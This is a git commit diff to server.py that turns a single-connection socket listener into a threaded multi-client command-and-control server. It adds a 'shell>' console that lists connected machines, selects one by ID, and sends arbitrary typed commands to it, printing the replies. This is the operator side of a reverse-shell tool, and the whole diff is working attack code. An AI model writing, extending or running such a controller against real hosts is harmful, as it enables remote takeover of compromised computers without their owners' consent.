64a5f15a8bc00d33c850c2a47685de040c85197b
tranlequocthong313 <tranlequocthong313@gmail.com>
2023-07-22 12:30:43 +0700

    Update server.py

--- server.py
+++ server.py
@@ -1,7 +1,5 @@
 import socket
-import sys
 import threading
-import time
 from queue import Queue
 
 NUMBER_OF_THREADS = 2
@@ -42,26 +40,9 @@ def socket_listen():
     s.listen(5)
 
 
-def send_commands(connection):
-    while True:
-        cmd = input().strip()
-
-        if cmd == "quit":
-            connection.close()
-            s.close()
-            sys.exit()
-
-        if len(cmd) == 0:
-            continue
-
-        connection.send(str.encode(cmd))
-        client_response = str(connection.recv(1024), "utf-8")
-        print(client_response, end="")
-
-
 def accept_connection():
-    for conn in connections:
-        conn.close
+    for connection in connections:
+        connection.close
 
     del connections[:]
     del addresses[:]
@@ -79,11 +60,96 @@ def accept_connection():
             print("Error accepting connection " + str(e))
 
 
-def main():
-    create_socket()
-    bind_socket()
-    socket_listen()
-    accept_connection()
+def start_shell():
+    while True:
+        cmd = input("shell> ")
+        if cmd == "list":
+            list_connections()
+        elif 'select' in cmd:
+            id, target = get_target(cmd)
+
+            if target is None:
+                return
+
+            print("You now connected to: " + str(addresses[id][0]))
+            print(str(addresses[id][0]) + ">", end="")
+
+            send_commands(target)
+        else:
+            print("Command not recognized")
 
 
-main()
+def list_connections():
+    print(" ---- Clients ---- " + "\n")
+    print("{:<8} {:<15} {:<10}".format('ID', 'IP', 'PORT') + "\n")
+
+    for i, connection in enumerate(connections):
+        try:
+            connection.send(str.encode(" "))
+            connection.recv(201480)
+        except:
+            del connections[i]
+            del addresses[i]
+            continue
+
+        print("{:<8} {:<15} {:<10}".format(str(i), str(addresses[i][0]), str(addresses[i][1])) + "\n")
+
+
+def get_target(cmd):
+    try:
+        target = cmd.replace("select ", "")
+        target = int(target)
+        return target, connections[target]
+    except:
+        print("Selection not valid")
+
+
+def send_commands(connection):
+    while True:
+        try:
+            cmd = input().strip()
+
+            if cmd == "exit":
+                break
+
+            if len(cmd) == 0:
+                continue
+
+            connection.send(str.encode(cmd))
+            client_response = str(connection.recv(20480), "utf-8")
+            print(client_response, end="")
+        except:
+            print("Error sending commands")
+            break
+
+
+def create_workers():
+    for _ in range(NUMBER_OF_THREADS):
+        t = threading.Thread(target=work)
+        t.daemon = True  # end threads when process stops
+        t.start()
+
+
+def work():
+    while True:
+        x = queue.get()
+        if x == 1:
+            create_socket()
+            bind_socket()
+            socket_listen()
+            accept_connection()
+        elif x == 2:
+            start_shell()
+
+        queue.task_done()
+
+
+def create_jobs():
+    for x in JOB_NUMBER:
+        queue.put(x)
+
+    queue.join()
+
+
+create_workers()
+create_jobs()
